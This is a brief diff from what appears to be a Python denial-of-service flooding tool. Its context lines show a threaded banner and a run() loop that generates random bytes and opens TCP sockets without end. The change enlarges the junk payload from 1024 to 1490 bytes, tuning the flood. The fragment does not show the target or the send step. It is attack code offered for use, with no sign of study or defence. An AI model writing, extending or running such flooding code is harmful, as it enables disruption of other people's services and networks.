@@ -18,7 +18,7 @@ print "\033[91m [!] Please Wait While Packages Are Preparing Thread : \033[1m",t
 time.sleep(5)
 
 def run():
-	bytes = random._urandom(1024)
+	bytes = random._urandom(1490)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
